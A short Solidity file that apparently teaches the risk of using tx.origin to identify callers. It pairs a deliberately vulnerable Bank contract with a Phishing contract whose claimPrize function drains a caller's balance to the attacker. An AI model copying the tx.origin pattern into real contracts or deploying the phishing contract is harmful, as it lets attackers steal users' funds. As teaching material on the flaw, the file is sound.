// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;
/*
    Risks of using tx.origin to identify caller
*/

contract Bank {
    mapping(address => uint) private _balances;

    function deposit() external payable {
        require(msg.value > 0, "Insufficient amount");
        _balances[tx.origin] += msg.value;
    }

    function transfer(address payable recipient, uint amount) external {
        require(_balances[tx.origin] >= amount, "Insufficient balance");
        _balances[tx.origin] -= amount;
        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Transfer failed");
    }

    function userBalance() external view returns (uint) {
        return _balances[tx.origin];
    }

}

contract Phishing {
    Bank bank;
    address payable attacker;

    constructor(address _bank) public {
        bank = Bank(_bank);
        attacker = msg.sender;
    }
    
    /// @notice Malicious function to lure the caller into transferring their funds in `Bank` to the attacker
    function claimPrize() external {
        bank.transfer(attacker, bank.userBalance());
    }
}
